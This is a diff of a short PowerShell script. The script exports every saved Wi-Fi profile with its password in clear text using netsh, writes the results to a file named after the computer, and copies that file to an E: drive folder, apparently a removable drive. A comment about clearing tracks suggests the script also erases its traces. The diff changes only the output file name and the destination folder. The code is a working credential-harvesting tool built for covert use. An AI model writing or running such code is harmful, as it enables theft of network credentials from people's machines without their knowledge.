@@ -2,8 +2,7 @@
 $p = "C:\wipass"
 mkdir $p
 cd $p
-
-$PC_NAME = "$env:computername wifipass"
+$PC_NAME = "$env:computername"
 
 # Get all saved wifi password
 netsh wlan export profile key=clear
@@ -14,7 +13,7 @@ Out-File "$PC_NAME.txt" -Append -InputObject $a
 }
 
 
-copy-item "C:\wipass\$PC_NAME.txt" E:\Data
+copy-item "C:\wipass\$PC_NAME.txt" E:\Data\wifipass
 
 
 # Clear tracks
